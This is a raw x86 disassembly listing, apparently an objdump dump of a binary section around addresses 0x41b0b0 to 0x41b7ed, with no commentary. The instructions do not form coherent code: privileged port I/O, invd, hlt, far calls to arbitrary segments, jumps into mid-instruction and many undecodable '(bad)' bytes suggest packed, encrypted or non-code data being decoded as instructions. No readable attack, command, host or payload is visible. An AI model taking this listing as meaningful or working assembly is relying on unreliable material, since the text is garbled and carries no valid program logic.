  41b0b0:	dec    esp
  41b0b1:	push   ecx
  41b0b2:	push   cs
  41b0b3:	fwait
  41b0b4:	fs jecxz 0x41b0a2
  41b0b7:	ds dec esi
  41b0b9:	nop
  41b0ba:	nop
  41b0bb:	and    ebp,DWORD PTR [eax]
  41b0bd:	pop    ebp
  41b0be:	cmp    al,0x5d
  41b0c0:	mov    al,0x27
  41b0c2:	daa    
  41b0c3:	ret    
  41b0c4:	xor    al,0xc5
  41b0c6:	adc    al,0x80
  41b0c8:	and    BYTE PTR [ebx-0x7373d694],dl
  41b0ce:	xor    ecx,ecx
  41b0d0:	int    0xc3
  41b0d2:	xchg   esp,eax
  41b0d3:	lock iret 
  41b0d5:	mov    WORD PTR [edx-0x7cf657f9],?
  41b0db:	or     DWORD PTR [ecx],0x4485fa3a
  41b0e1:	pusha  
  41b0e2:	fldenv [ebp-0x80]
  41b0e5:	scas   al,BYTE PTR es:[edi]
  41b0e6:	add    al,0x19
  41b0e8:	dec    eax
  41b0e9:	push   edx
  41b0ea:	icebp  
  41b0eb:	retf   0xb7ee
  41b0ee:	pop    esi
  41b0ef:	out    0x1e,eax
  41b0f1:	push   es
  41b0f2:	inc    ecx
  41b0f3:	ss out dx,eax
  41b0f5:	in     al,dx
  41b0f6:	in     al,dx
  41b0f7:	mov    ds:0x9c801ed0,al
  41b0fc:	inc    eax
  41b0fd:	test   eax,edx
  41b0ff:	or     BYTE PTR [eax],al
  41b101:	jmp    0x41b095
  41b103:	or     eax,0xece95646
  41b108:	in     al,dx
  41b109:	sub    DWORD PTR [eax+0x4e],ecx
  41b10c:	push   es
  41b10d:	and    edi,ebx
  41b10f:	mov    eax,ss
  41b111:	push   es
  41b112:	mov    cl,0x18
  41b114:	sbb    ebp,DWORD PTR [ecx+0x7738ec1c]
  41b11a:	enter  0xc0b,0x56
  41b11e:	fild   DWORD PTR [esi]
  41b120:	rcl    DWORD PTR [ecx-0x3eff1b64],1
  41b126:	fmul   DWORD PTR ds:0x783237d1
  41b12c:	js     0x41b10e
  41b12e:	push   ebx
  41b12f:	sbb    ah,al
  41b131:	loopne 0x41b19d
  41b133:	sbb    eax,eax
  41b135:	and    cl,cl
  41b137:	int3   
  41b138:	out    dx,al
  41b139:	xor    bl,BYTE PTR fs:[eax-0x3e]
  41b13d:	or     DWORD PTR [edi+0x19eb3ad1],ebp
  41b143:	fs pop ecx
  41b145:	cmp    BYTE PTR [eax+0x29],dl
  41b148:	loopne 0x41b136
  41b14a:	loopne 0x41b163
  41b14c:	enter  0x8f3,0xb6
  41b150:	shl    esp,1
  41b152:	ror    DWORD PTR [ecx+ecx*2],cl
  41b155:	dec    esp
  41b156:	sahf   
  41b157:	shl    eax,1
  41b159:	push   ds
  41b15a:	nop
  41b15b:	repnz xchg edx,eax
  41b15d:	or     BYTE PTR [ecx+0x1f],cl
  41b160:	push   ds
  41b161:	and    dl,bh
  41b163:	mov    edx,0x2a00c9e5
  41b168:	adc    eax,0x750369d2
  41b16d:	ins    BYTE PTR es:[edi],dx
  41b16e:	call   0xf3d2:0xb89d69a6
  41b175:	adc    al,0xd3
  41b177:	imul   edx,DWORD PTR [esi+0x4e31b34d],0x1f
  41b17e:	aam    0x38
  41b180:	bt     si,0x5b
  41b185:	mov    dl,0xe
  41b187:	aam    0x13
  41b189:	sbb    DWORD PTR [ebx+eax*1-0x4edf1948],0xd3f1d369
  41b194:	push   ds
  41b195:	xor    DWORD PTR [eax-0x37f1b530],esp
  41b19b:	(bad)  
  41b19c:	test   al,0x8
  41b19e:	add    BYTE PTR [edx-0x4013bb6b],dh
  41b1a4:	daa    
  41b1a5:	push   ds
  41b1a6:	sbb    al,BYTE PTR [eax+esi*4-0x6b]
  41b1aa:	les    ebx,FWORD PTR [esi]
  41b1ac:	sbb    DWORD PTR [ecx],esp
  41b1ae:	adc    DWORD PTR [ebp+eax*4+0x1e],ebp
  41b1b2:	and    BYTE PTR [esi],bl
  41b1b4:	pop    ss
  41b1b5:	dec    eax
  41b1b6:	add    al,0x5b
  41b1b8:	and    BYTE PTR [esi],bl
  41b1ba:	xor    ebx,ecx
  41b1bc:	push   esi
  41b1bd:	adc    dh,BYTE PTR [ebx+0x1c1e1cdc]
  41b1c3:	les    esp,FWORD PTR [eax+0x2b]
  41b1c6:	mov    DWORD PTR [esi+0x1b],edx
  41b1c9:	lods   eax,DWORD PTR ds:[esi]
  41b1ca:	in     al,0x96
  41b1cc:	sbb    al,bl
  41b1ce:	adc    BYTE PTR [ecx],0xe4
  41b1d1:	xor    dl,BYTE PTR [ecx]
  41b1d3:	loopne 0x41b1f9
  41b1d5:	cs ins BYTE PTR es:[edi],dx
  41b1d7:	inc    eax
  41b1d8:	loopne 0x41b1bd
  41b1da:	fcom   QWORD PTR [ecx]
  41b1dc:	inc    eax
  41b1dd:	loop   0x41b1a1
  41b1df:	push   cs
  41b1e0:	fcomp  QWORD PTR [ebx]
  41b1e2:	fcom   DWORD PTR [ecx]
  41b1e4:	xor    cl,BYTE PTR [ecx+0xc]
  41b1e7:	ins    BYTE PTR es:[edi],dx
  41b1e8:	fcomp  DWORD PTR [edx]
  41b1ea:	adc    esp,edx
  41b1ec:	and    ecx,DWORD PTR [ecx-0x232bf26b]
  41b1f2:	cs xor bl,dl
  41b1f5:	lods   al,BYTE PTR ds:[esi]
  41b1f6:	cmp    bh,BYTE PTR gs:[edi-0x4df999d7]
  41b1fd:	sbb    eax,0xbf98cc6b
  41b202:	hlt    
  41b203:	mov    dh,0xcc
  41b205:	fsub   DWORD PTR [ebx+eiz*1+0x24]
  41b209:	adc    DWORD PTR [esi+0x312437c8],ebx
  41b20f:	nop
  41b210:	in     eax,0xc0
  41b212:	lods   al,BYTE PTR ds:[esi]
  41b213:	enter  0x5c11,0x9e
  41b217:	pop    ebp
  41b218:	dec    esi
  41b219:	xchg   ecx,eax
  41b21a:	aam    0x6e
  41b21c:	(bad)  
  41b21d:	add    esp,ebp
  41b21f:	aam    0x2
  41b221:	aad    0xdb
  41b223:	xor    al,0x4d
  41b225:	mov    bl,0x1e
  41b227:	inc    ecx
  41b228:	and    DWORD PTR fs:[edx+0x364c23d5],0xffffffe9
  41b230:	cs mov bl,0xb
  41b233:	pusha  
  41b234:	adc    edx,eax
  41b236:	adc    ebx,DWORD PTR [ebx+0x3edd765]
  41b23c:	or     dl,dh
  41b23e:	daa    
  41b23f:	inc    esp
  41b240:	(bad)  
  41b241:	adc    DWORD PTR [ecx+0x21],esi
  41b244:	dec    esp
  41b245:	enter  0xc4c4,0x49
  41b249:	shl    BYTE PTR [esi+eax*1],0x76
  41b24d:	and    BYTE PTR [ecx],dl
  41b24f:	rcr    BYTE PTR [ebx],0x11
  41b252:	sbb    BYTE PTR [edx-0x4343d1bf],dh
  41b258:	and    bl,ch
  41b25a:	or     al,0x96
  41b25c:	lea    edx,[eax+0x24312234]
  41b262:	test   cl,al
  41b264:	sbb    BYTE PTR [ecx+edx*2-0x4f6b54c],dh
  41b26b:	dec    eax
  41b26c:	dec    eax
  41b26d:	xor    BYTE PTR [ebx-0x50],dl
  41b270:	push   ds
  41b271:	bound  edx,QWORD PTR [eax-0x4feeed91]
  41b277:	mov    al,0xac
  41b279:	mov    DWORD PTR [ebx],ecx
  41b27b:	arpl   WORD PTR [edx+0x11],ax
  41b27e:	lods   al,BYTE PTR ds:[esi]
  41b27f:	dec    esi
  41b280:	test   al,0x11
  41b282:	nop
  41b283:	mov    eax,0xeaa809b0
  41b288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b289:	adc    DWORD PTR [edx],esi
  41b28b:	adc    cl,BYTE PTR [ebx]
  41b28d:	fwait
  41b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28f:	sbb    al,0x2e
  41b291:	mov    bh,0x1c
  41b293:	adc    cl,bl
  41b295:	push   ss
  41b296:	ret    0x9c11
  41b299:	dec    ebx
  41b29a:	and    cl,al
  41b29c:	pusha  
  41b29d:	cmp    BYTE PTR [ecx+edx*1+0x1246e120],bl
  41b2a4:	sub    eax,0x2641111b
  41b2a9:	jecxz  0x41b2e4
  41b2ab:	rcr    eax,0x94
  41b2ae:	dec    esi
  41b2af:	xchg   esp,eax
  41b2b0:	leave  
  41b2b1:	inc    ecx
  41b2b2:	push   cs
  41b2b3:	adc    dl,BYTE PTR [ecx]
  41b2b5:	xor    DWORD PTR [eax+0xac910c1],esp
  41b2bb:	xor    bl,cl
  41b2bd:	nop
  41b2be:	sub    DWORD PTR [eax-0x3e683b0b],edx
  41b2c4:	iret   
  41b2c5:	sub    edi,edx
  41b2c7:	nop
  41b2c8:	mov    edx,0xba98ea02
  41b2cd:	add    eax,0x97207125
  41b2d2:	push   ds
  41b2d3:	lods   al,BYTE PTR ds:[esi]
  41b2d4:	mov    eax,0x40e40e04
  41b2d9:	mov    dh,0x33
  41b2db:	enter  0xe4d0,0x18
  41b2df:	pop    esp
  41b2e0:	and    DWORD PTR [ecx+0x38],esi
  41b2e3:	nop
  41b2e4:	sbb    ecx,DWORD PTR [edx-0xfd75c88]
  41b2ea:	or     BYTE PTR [edx+0x1a],dh
  41b2ed:	push   es
  41b2ee:	aas    
  41b2ef:	bound  esi,QWORD PTR [esi+0x78]
  41b2f2:	hlt    
  41b2f3:	in     eax,0x89
  41b2f5:	loop   0x41b366
  41b2f7:	push   es
  41b2f8:	xor    al,0x1
  41b2fa:	sub    BYTE PTR [edi-0x3fada1f9],dl
  41b300:	cmovne ebp,DWORD PTR [ebp+0x70]
  41b304:	je     0x41b37f
  41b306:	pop    ebx
  41b307:	dec    esi
  41b308:	jne    0x41b380
  41b30a:	repz inc ebp
  41b30c:	or     bl,bl
  41b30e:	invd   
  41b310:	push   ebx
  41b311:	ins    DWORD PTR es:[edi],dx
  41b312:	popa   
  41b313:	adc    ch,cl
  41b315:	popa   
  41b316:	lea    ebp,[edx+0x4907139d]
  41b31c:	sbb    DWORD PTR [ebx-0x58],ebx
  41b31f:	push   0xe
  41b321:	ds jb  0x41b347
  41b324:	push   es
  41b325:	stc    
  41b326:	fs (bad) 
  41b328:	fistp  DWORD PTR [edi]
  41b32a:	ins    BYTE PTR es:[di],dx
  41b32c:	push   ecx
  41b32d:	cmove  ebp,DWORD PTR [edi+0x75]
  41b331:	bound  edx,QWORD PTR [edx-0x40]
  41b334:	dec    DWORD PTR ds:0x72754343
  41b33a:	jb     0x41b3a1
  41b33c:	outs   dx,BYTE PTR ds:[esi]
  41b33d:	arpl   bx,ax
  41b33f:	push   es
  41b340:	je     0x41b34a
  41b342:	push   es
  41b343:	dec    esp
  41b344:	mul    DWORD PTR [ecx-0x79]
  41b347:	mov    al,ds:0x7f304f5d
  41b34c:	xor    ebx,DWORD PTR [eax]
  41b34e:	push   ecx
  41b34f:	inc    ecx
  41b350:	stos   BYTE PTR es:[edi],al
  41b351:	dec    esi
  41b352:	inc    edi
  41b353:	and    BYTE PTR [eax-0x59],ah
  41b356:	or     bl,BYTE PTR [edx-0x79]
  41b359:	dec    ecx
  41b35a:	xchg   ebp,eax
  41b35b:	in     al,dx
  41b35c:	xchg   BYTE PTR [eax+0xf6e6165],al
  41b362:	mov    ebx,edi
  41b364:	and    eax,0x551fb27f
  41b369:	outs   dx,BYTE PTR ds:[esi]
  41b36a:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  41b36e:	inc    esp
  41b36f:	arpl   WORD PTR gs:[ecx-0x32],bp
  41b373:	xchg   edi,eax
  41b374:	jge    0x41b38e
  41b376:	nop
  41b377:	repz and al,0x30
  41b37a:	inc    esi
  41b37b:	out    0x68,eax
  41b37d:	and    eax,0x5a6dcc0f
  41b382:	je     0x41b35c
  41b384:	mov    ds:0x6027942,eax
  41b389:	xacquire xchg DWORD PTR [ebx],ebx
  41b38c:	push   edi
  41b38d:	outs   dx,DWORD PTR ds:[esi]
  41b38e:	jb     0x41b3f4
  41b390:	jbe    0x41b401
  41b392:	pusha  
  41b393:	scas   al,BYTE PTR es:[edi]
  41b394:	pushf  
  41b395:	adc    esp,DWORD PTR [ebx+0x1343642]
  41b39b:	rcl    DWORD PTR [eax+0x678b5322],0x0
  41b3a2:	mov    bh,BYTE PTR [edi-0x60]
  41b3a5:	or     al,dl
  41b3a7:	ins    BYTE PTR es:[edi],dx
  41b3a8:	dec    ebp
  41b3a9:	push   ss
  41b3aa:	pminub mm3,mm1
  41b3ad:	push   es
  41b3ae:	sti    
  41b3af:	mov    eax,ds:0x78d1b5e7
  41b3b4:	push   ebx
  41b3b5:	mov    al,0xff
  41b3b7:	adc    al,0x77
  41b3b9:	push   ss
  41b3ba:	inc    ecx
  41b3bb:	fcom   st(7)
  41b3bd:	jnp    0x41b3c8
  41b3bf:	mov    al,0x11
  41b3c1:	paddb  mm7,QWORD PTR [esi-0x37]
  41b3c5:	xchg   edi,eax
  41b3c6:	and    BYTE PTR [ebp-0x49deabc],bh
  41b3cc:	jmp    0x41b3d8
  41b3ce:	mov    edx,0x3641d9f0
  41b3d3:	retf   
  41b3d4:	nop
  41b3d5:	pop    ss
  41b3d6:	add    DWORD PTR [esi],ecx
  41b3d8:	add    dl,bl
  41b3da:	clc    
  41b3db:	adc    BYTE PTR [ebx-0x728e1420],dh
  41b3e1:	jl     0x41b3ad
  41b3e3:	cmp    ecx,DWORD PTR [ebp-0x758b5286]
  41b3e9:	(bad)  
  41b3ea:	push   cs
  41b3eb:	push   ecx
  41b3ec:	jl     0x41b45d
  41b3ee:	push   edx
  41b3ef:	sub    BYTE PTR [ebx-0x59f002a2],0x7b
  41b3f6:	jb     0x41b3fe
  41b3f8:	add    al,BYTE PTR [edx]
  41b3fa:	sbb    esp,ebx
  41b3fc:	and    al,0xfe
  41b3fe:	mov    cl,0xc5
  41b400:	xchg   esi,eax
  41b401:	pop    ds
  41b402:	out    dx,al
  41b403:	cs dec esp
  41b405:	lea    esi,[eax-0x4c5d3871]
  41b40b:	add    al,BYTE PTR [edi-0x3c5fab9c]
  41b411:	adc    eax,0xfb3fb5f2
  41b416:	xlat   BYTE PTR ds:[ebx]
  41b417:	adc    ch,BYTE PTR [ecx]
  41b419:	shl    dh,1
  41b41b:	(bad)  
  41b41c:	and    BYTE PTR [ebx+eax*4-0x7b],dh
  41b420:	or     al,0x30
  41b422:	fs nop
  41b424:	outs   dx,DWORD PTR ds:[esi]
  41b425:	adc    al,BYTE PTR [eax+0x1c]
  41b428:	call   0x7a423bc6
  41b42d:	loope  0x41b408
  41b42f:	inc    edi
  41b430:	(bad)  
  41b431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b432:	sbb    BYTE PTR [eax+0x4f0ced13],dh
  41b438:	add    eax,0xe94a0a1d
  41b43d:	punpcklbw mm1,mm0
  41b440:	xchg   ebx,eax
  41b441:	fwait
  41b442:	inc    ecx
  41b443:	outs   dx,BYTE PTR ds:[esi]
  41b444:	jns    0x41b444
  41b446:	xchg   ebp,eax
  41b447:	jnp    0x41b42d
  41b449:	test   BYTE PTR [eax],ah
  41b44b:	mov    ds:0x66655206,eax
  41b450:	ud1    edx,ecx
  41b453:	bound  ebx,QWORD PTR [ecx]
  41b455:	xchg   edi,eax
  41b456:	sub    bh,0x3
  41b459:	or     bl,cl
  41b45b:	xor    eax,0x684141a2
  41b460:	mov    edi,0xa87c8002
  41b465:	mov    edx,0x1720cab4
  41b46a:	dec    esp
  41b46b:	fiadd  DWORD PTR [ebx+0x30]
  41b46e:	xor    dh,BYTE PTR [edx]
  41b470:	or     BYTE PTR [edi],0xc1
  41b473:	mov    ah,0xc8
  41b475:	mov    bh,0x40
  41b477:	jbe    0x41b3ff
  41b479:	sahf   
  41b47a:	inc    esp
  41b47b:	inc    ecx
  41b47c:	pop    edi
  41b47d:	mov    esi,0xea838f18
  41b482:	and    ah,bl
  41b484:	push   0x3ce1041c
  41b489:	xlat   BYTE PTR ds:[ebx]
  41b48a:	test   BYTE PTR [ebx],0xa
  41b48d:	mov    dl,0xcd
  41b48f:	(bad)  
  41b491:	aaa    
  41b492:	sub    BYTE PTR [ebp+edi*8+0x25],ch
  41b496:	push   0xffffffe1
  41b498:	dec    ebx
  41b499:	sbb    DWORD PTR [ecx+0x48b6a7c],0xffffff98
  41b4a0:	cmp    eax,DWORD PTR ds:0xd417bbf8
  41b4a6:	add    al,0xbf
  41b4a8:	add    eax,0x75ff17a1
  41b4ad:	leave  
  41b4ae:	fsub   QWORD PTR [ebp+edx*1+0x6d]
  41b4b2:	aam    0x39
  41b4b4:	dec    ebx
  41b4b5:	add    DWORD PTR [eax],ebx
  41b4b7:	push   0xeef2ccb0
  41b4bc:	fsub   st(2),st
  41b4be:	test   BYTE PTR [edx-0x6b33109d],ch
  41b4c4:	xchg   ebx,eax
  41b4c5:	push   ecx
  41b4c6:	test   BYTE PTR [ebp-0x74a3fee8],ah
  41b4cc:	cmc    
  41b4cd:	push   es
  41b4ce:	ret    
  41b4cf:	sub    DWORD PTR [edx-0x76ebc760],ebx
  41b4d5:	push   eax
  41b4d6:	xchg   ecx,eax
  41b4d7:	cmp    dl,BYTE PTR [esi+0x1c]
  41b4da:	xlat   BYTE PTR fs:[ebx]
  41b4dc:	sbb    al,0xeb
  41b4de:	sbb    al,0xcc
  41b4e0:	mov    WORD PTR ds:0x7f8926a0,ds
  41b4e6:	clc    
  41b4e7:	cdq    
  41b4e8:	pop    ss
  41b4e9:	mov    edi,0x7d0619c0
  41b4ee:	jne    0x41b52b
  41b4f0:	jnp    0x41b4f6
  41b4f2:	je     0x41b513
  41b4f4:	jl     0x41b525
  41b4f6:	bound  ebx,QWORD PTR [ebx]
  41b4f8:	xor    BYTE PTR [edi+0x10],al
  41b4fb:	pop    ds
  41b4fc:	into   
  41b4fd:	xor    eax,0xb0b014ef
  41b502:	clc    
  41b503:	inc    ebx
  41b504:	cmp    BYTE PTR [edi+0x8],bh
  41b507:	add    eax,0xb8b606e
  41b50c:	pop    ebp
  41b50d:	clc    
  41b50e:	mov    edx,0x3f662b46
  41b513:	jnp    0x41b4db
  41b515:	xor    eax,0x83bf1438
  41b51a:	call   0x5214:0x8da445e8
  41b521:	add    edx,0xf7aa1050
  41b527:	mov    esi,0x2448aa4
  41b52c:	(bad)  
  41b52d:	inc    ecx
  41b52e:	xor    al,0x97
  41b530:	mov    esi,0xc4d9c577
  41b535:	int3   
  41b536:	pop    edi
  41b537:	mov    ebp,DWORD PTR [eax]
  41b539:	call   DWORD PTR [ebp+0x7d]
  41b53c:	adc    dl,BYTE PTR [eax+0x1082399d]
  41b542:	(bad)
  41b545:	mov    BYTE PTR [ecx-0x50],bl
  41b548:	test   al,0xd7
  41b54a:	mov    DWORD PTR [edx-0x75],0x88dda3f8
  41b551:	push   ebp
  41b552:	sti    
  41b553:	push   ebx
  41b554:	jle    0x41b533
  41b556:	pop    edx
  41b557:	xchg   edx,eax
  41b558:	pop    ss
  41b559:	inc    edi
  41b55a:	fcomp  QWORD PTR [edx]
  41b55c:	dec    ebp
  41b55d:	inc    eax
  41b55e:	add    al,0xd0
  41b560:	inc    ebp
  41b561:	rol    DWORD PTR [ebx+edx*2+0x16],1
  41b565:	push   eax
  41b566:	adc    eax,0xf8744c81
  41b56b:	stos   DWORD PTR es:[edi],eax
  41b56c:	mov    ecx,DWORD PTR ds:0x3b65467f
  41b572:	inc    eax
  41b573:	dec    esi
  41b574:	inc    edx
  41b575:	jns    0x41b5c5
  41b577:	fmul   QWORD PTR [edx+0x449ea75e]
  41b57d:	jo     0x41b4ff
  41b57f:	loop   0x41b5d3
  41b581:	and    DWORD PTR [eax],ecx
  41b583:	cmovne eax,DWORD PTR [eax+0x87ed9e0]
  41b58a:	or     eax,0x6083a423
  41b58f:	int3   
  41b590:	lds    ebp,FWORD PTR [eax+0x69e99740]
  41b596:	mov    DWORD PTR [edx+0x1b],ecx
  41b599:	pop    edi
  41b59a:	mov    ds:0x5690e102,eax
  41b59f:	add    esi,esi
  41b5a1:	sub    esp,ebx
  41b5a3:	add    eax,ebx
  41b5a5:	or     eax,ebx
  41b5a7:	sbb    BYTE PTR [edi],ah
  41b5a9:	mov    ebp,0xd9e66018
  41b5ae:	pop    es
  41b5af:	mov    cl,0x78
  41b5b1:	xor    eax,DWORD PTR [ebx+0x54459be8]
  41b5b7:	sbb    ecx,DWORD PTR [edx]
  41b5b9:	pushf  
  41b5ba:	xchg   edi,eax
  41b5bb:	mov    al,0x49
  41b5bd:	add    eax,0xf7ffc807
  41b5c2:	or     ebx,DWORD PTR [edx+0x51]
  41b5c5:	sub    eax,0xb16753ba
  41b5ca:	pusha  
  41b5cb:	clc    
  41b5cc:	sbb    DWORD PTR [eax],ecx
  41b5ce:	push   ds
  41b5cf:	and    sp,cx
  41b5d2:	cmp    eax,0x51ca0140
  41b5d7:	test   esi,eax
  41b5d9:	dec    esp
  41b5da:	dec    eax
  41b5db:	push   eax
  41b5dc:	or     esp,ebx
  41b5de:	pop    ebx
  41b5df:	mov    esi,edx
  41b5e1:	(bad)  
  41b5e2:	(bad)  
  41b5e3:	jae    0x41b62a
  41b5e5:	loopne 0x41b5e5
  41b5e7:	jns    0x41b5f7
  41b5e9:	es inc esi
  41b5eb:	rcl    DWORD PTR [esi+0x607723b],0xea
  41b5f2:	jbe    0x41b5ab
  41b5f4:	sub    edx,DWORD PTR ds:0x80f86a2d
  41b5fa:	sbb    al,0x43
  41b5fc:	jle    0x41b62b
  41b5fe:	popa   
  41b5ff:	jle    0x41b64c
  41b601:	jle    0x41b5bb
  41b603:	fst    QWORD PTR ds:0xa1bc6216
  41b609:	cmp    al,0xcd
  41b60b:	dec    ecx
  41b60c:	sti    
  41b60d:	pushf  
  41b60e:	fsub   DWORD PTR [eax-0x21]
  41b611:	push   cs
  41b612:	sub    al,0x4b
  41b614:	cmp    eax,edx
  41b616:	setg   BYTE PTR [eax]
  41b619:	and    BYTE PTR es:[esi-0x76],al
  41b61d:	loopne 0x41b60f
  41b61f:	mov    eax,DWORD PTR [eax+edi*4-0x7bf547aa]
  41b626:	gs addr16 xor al,0x53
  41b62a:	in     al,dx
  41b62b:	jne    0x41b691
  41b62d:	jo     0x41b5b8
  41b62f:	sub    al,BYTE PTR [ecx-0x3a224064]
  41b635:	dec    ecx
  41b636:	sahf   
  41b637:	inc    esp
  41b638:	add    al,0x2b
  41b63a:	aaa    
  41b63b:	fsubp  st(6),st
  41b63d:	fs dec edi
  41b63f:	mov    ebx,0x48752c14
  41b644:	lahf   
  41b645:	push   0x75b83438
  41b64a:	add    eax,DWORD PTR [ecx+0x6e]
  41b64d:	inc    ecx
  41b64e:	test   DWORD PTR [eax-0x26],ecx
  41b651:	adc    DWORD PTR [ebx-0x4617d3d1],edx
  41b657:	adc    eax,0x40f2f031
  41b65c:	dec    eax
  41b65d:	les    edx,FWORD PTR [ecx]
  41b65f:	mov    ds:0x64b421f4,al
  41b664:	jne    0x41b68d
  41b666:	inc    ecx
  41b667:	add    DWORD PTR [ecx+0x3e],edi
  41b66a:	(bad)  
  41b66c:	loope  0x41b6ec
  41b66e:	pop    eax
  41b66f:	jae    0x41b603
  41b671:	ficom  WORD PTR [eax+ecx*1]
  41b674:	jns    0x41b6b0
  41b676:	retf   0xb838
  41b679:	jl     0x41b6c8
  41b67b:	ja     0x41b6f4
  41b67d:	stos   DWORD PTR es:[edi],eax
  41b67e:	stos   DWORD PTR es:[edi],eax
  41b67f:	mov    ds:0xa4b81604,eax
  41b684:	mov    ebp,0xcfba0809
  41b689:	data16 add bh,al
  41b68c:	mov    ah,0xbc
  41b68e:	push   esp
  41b68f:	pushf  
  41b690:	sbb    DWORD PTR [eax],edx
  41b692:	push   0x802e91df
  41b697:	les    edi,FWORD PTR [esp+eax*2-0x6ff328d0]
  41b69e:	mov    esi,0xf391df27
  41b6a3:	nop
  41b6a4:	(bad)  
  41b6a5:	sbb    DWORD PTR [esp+edi*4+0x26f826ca],eax
  41b6ac:	cmp    esp,DWORD PTR [ebx]
  41b6ae:	dec    edi
  41b6af:	(bad)  
  41b6b1:	hlt    
  41b6b2:	loop   0x41b678
  41b6b4:	push   ebx
  41b6b5:	xchg   ecx,eax
  41b6b6:	nop
  41b6b7:	leave  
  41b6b8:	test   eax,0x107297e8
  41b6bd:	into   
  41b6be:	dec    ecx
  41b6bf:	jo     0x41b739
  41b6c1:	xor    esp,DWORD PTR [ecx]
  41b6c3:	fild   WORD PTR [ebp+0x345ccc9c]
  41b6c9:	aas    
  41b6ca:	sub    bh,bl
  41b6cc:	pop    ds
  41b6cd:	add    BYTE PTR [esi-0x4a],al
  41b6d0:	fidiv  DWORD PTR [ebx+edx*1]
  41b6d3:	xchg   esi,eax
  41b6d4:	cmp    eax,eax
  41b6d6:	and    al,0xbe
  41b6d8:	(bad)  
  41b6da:	pusha  
  41b6db:	into   
  41b6dc:	call   0x3039a6e5
  41b6e1:	cld    
  41b6e2:	mov    edi,0x2a0c7f3c
  41b6e7:	sub    cl,BYTE PTR [eax]
  41b6e9:	or     dh,BYTE PTR ds:0x153e2918
  41b6ef:	das    
  41b6f0:	or     al,0x53
  41b6f2:	adc    eax,0xffff3916
  41b6f7:	(bad)  
  41b6f8:	jmp    DWORD PTR [ecx]
  41b6fa:	gs arpl WORD PTR fs:[edx+0x61],sp
  41b6ff:	popa   
  41b700:	add    BYTE PTR [edi],dl
  41b702:	push   es
  41b703:	add    dh,BYTE PTR [edx]
  41b705:	and    al,0x1e
  41b707:	jno    0x41b70b
  41b709:	sub    BYTE PTR [esp+edi*2],ah
  41b70c:	jb     0x41b789
  41b70e:	sub    BYTE PTR [eax],dl
  41b710:	or     eax,0x4b7b670e
  41b715:	dec    ecx
  41b716:	dec    eax
  41b717:	jge    0x41b78e
  41b719:	(bad)  
  41b71a:	(bad)  
  41b71b:	(bad)  
  41b71c:	(bad)  
  41b71d:	jle    0x41b782
  41b71f:	pop    ecx
  41b720:	add    BYTE PTR [edi+0x44],bl
  41b723:	pop    esp
  41b724:	pop    ss
  41b725:	bound  ecx,QWORD PTR [bx+di+0x12]
  41b729:	outs   dx,DWORD PTR ds:[esi]
  41b72a:	jle    0x41b77a
  41b72c:	push   ebp
  41b72d:	pop    edi
  41b72e:	push   0x41
  41b730:	sbb    esp,DWORD PTR [edi+0x40]
  41b733:	inc    ebp
  41b734:	cs dec edx
  41b736:	dec    eax
  41b737:	jnp    0x41b792
  41b739:	jne    0x41b768
  41b73b:	cs push esi
  41b73d:	jecxz  0x41b73e
  41b73f:	(bad)  
  41b740:	jmp    DWORD PTR [edi+ebx*2]
  41b743:	jb     0x41b797
  41b745:	and    dh,BYTE PTR [ebp+0x5e]
  41b748:	pop    eax
  41b749:	pop    ecx
  41b74a:	je     0x41b788
  41b74c:	cmp    DWORD PTR [ebx+0x42],edx
  41b74f:	inc    esi
  41b750:	jbe    0x41b7a8
  41b752:	cmp    eax,0x3141366d
  41b757:	push   esi
  41b758:	push   ebp
  41b759:	push   esp
  41b75a:	pop    ebx
  41b75b:	or     BYTE PTR [ebx+0x7ffff5bf],ch
  41b761:	addr16 xor al,0x6d
  41b764:	outs   dx,DWORD PTR ds:[esi]
  41b765:	arpl   WORD PTR [ebx],si
  41b767:	imul   eax,DWORD PTR [ecx],0x1317643a
  41b76d:	bound  ecx,QWORD PTR [ebx]
  41b76f:	push   0xa1141918
  41b774:	pop    ds
  41b775:	cmp    al,0xe
  41b777:	es es (bad) 
  41b77a:	(bad)  
  41b77b:	(bad)  
  41b77c:	dec    DWORD PTR [eax]
  41b77e:	adc    eax,DWORD PTR [ebx]
  41b780:	adc    BYTE PTR [edx],dl
  41b782:	je     0x41b7b8
  41b784:	je     0x41b7f3
  41b786:	dec    ebp
  41b787:	push   ecx
  41b788:	add    ebx,DWORD PTR [eax+0xc]
  41b78b:	dec    ebp
  41b78c:	subps  xmm0,XMMWORD PTR [eax]
  41b78f:	pop    ds
  41b790:	or     ebx,DWORD PTR [eax+0x1]
  41b793:	jbe    0x41b7b4
  41b795:	push   0x18
  41b797:	pop    es
  41b798:	adc    eax,DWORD PTR [eax+0x6e]
  41b79b:	jge    0x41b7bc
  41b79d:	(bad)  
  41b79e:	(bad)  
  41b79f:	call   DWORD PTR [esi]
  41b7a1:	add    eax,0x66481b53
  41b7a6:	jbe    0x41b7cf
  41b7a8:	jl     0x41b7fb
  41b7aa:	and    esi,DWORD PTR fs:[eax+0x2c]
  41b7ae:	xor    esp,DWORD PTR [edi]
  41b7b0:	push   edx
  41b7b1:	and    BYTE PTR [ebx+0x2b],ah
  41b7b4:	js     0x41b80c
  41b7b6:	cmp    ebp,DWORD PTR es:[ecx-0x6]
  41b7ba:	jg     0x41b7b3
  41b7bc:	(bad)  
  41b7bd:	cmp    BYTE PTR [ebp+0x6f],bh
  41b7c0:	xor    ebp,DWORD PTR [ebx+0x4f]
  41b7c3:	outs   dx,BYTE PTR ds:[esi]
  41b7c4:	push   edx
  41b7c5:	xor    BYTE PTR [edx+0x33],dh
  41b7c8:	xor    ah,BYTE PTR [ebp+0x56]
  41b7cb:	and    DWORD PTR [edi],esi
  41b7cd:	push   ebx
  41b7ce:	push   eax
  41b7cf:	ins    BYTE PTR es:[edi],dx
  41b7d0:	or     BYTE PTR [ebx],cl
  41b7d2:	add    eax,0xf10c1019
  41b7d7:	pop    ss
  41b7d8:	clc    
  41b7d9:	fild   QWORD PTR [ebx+eiz*1+0x12]
  41b7dd:	ins    BYTE PTR es:[edi],dx
  41b7de:	pusha  
  41b7df:	jns    0x41b7ff
  41b7e1:	cmp    bh,BYTE PTR [ebx]
  41b7e3:	jge    0x41b7f0
  41b7e5:	cmp    DWORD PTR [ecx+0x71],esp
  41b7e8:	sub    eax,0x8b7f0302
  41b7ed:	jmp    FWORD PTR [edi]
